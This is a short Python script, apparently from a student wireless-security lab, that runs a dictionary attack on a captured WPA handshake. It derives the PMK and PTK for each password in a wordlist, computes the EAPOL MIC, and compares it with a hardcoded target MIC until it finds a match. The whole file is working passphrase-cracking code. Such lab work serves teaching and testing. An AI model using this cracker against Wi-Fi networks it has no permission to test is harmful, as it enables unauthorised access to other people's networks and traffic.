import sys
from scapy.all import *
from binascii import a2b_hex, b2a_hex

from files.wpa_key_derivation import extract_info_from_packet
# from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def compute_mic(passPhrase):


    # Important parameters for key derivation - most of them can be obtained from the pcap file
    A = "Pairwise key expansion"  # this string is used in the pseudo-random function

    ssid, APmac, Clientmac, ANonce, SNonce, _, eapol, data = extract_info_from_packet()

    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                                  SNonce)  # used in pseudo-random function

    data = a2b_hex(
        "0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)

    return mic

def get_mic_to_test():
    _, _, _, _, _, mic_to_test, _, _ = extract_info_from_packet()
    return mic_to_test.hex()

if len(sys.argv) != 2:
    print("Usage: python password_reader.py <filename>")
    sys.exit(1)

filename = sys.argv[1]

with open(filename, "r") as f:
    passwords = f.readlines()

a = get_mic_to_test()
mic_to_test = "36eef66540fa801ceee2fea9b7929b40fdb0abaa"

for password in passwords:
    password = password.strip()
    print("Testing password: {}".format(password))
    if compute_mic(password).hexdigest() == mic_to_test:
        print("Password found: {}".format(password))
        break
